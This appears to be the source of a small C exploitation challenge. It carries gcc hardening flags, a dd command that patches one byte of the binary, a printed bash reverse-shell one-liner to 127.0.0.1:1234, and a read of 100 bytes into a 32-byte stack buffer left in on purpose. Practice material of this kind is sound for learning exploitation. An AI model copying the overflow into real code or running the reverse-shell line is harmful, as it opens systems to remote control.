// gcc -Wno-implicit-function-declaration -o vuln vuln.c -fstack-protector-strong -Wl,-z,relro,-z,now -D_FORTIFY_SOURCE=1 -O1
// printf '\x64' | dd of=vuln bs=1 seek=$((0x1188)) conv=notrunc status=none

#include <stdio.h>
#include <unistd.h>

int main(){
	puts("/bin/bash -c 'exec 0<>/dev/tcp/127.0.0.1/1234; exec 1>&0; exec 2>&1; /bin/sh -i'");
	char s[32];
	while(read(0,s,100)) puts(s);
	return 0;
}
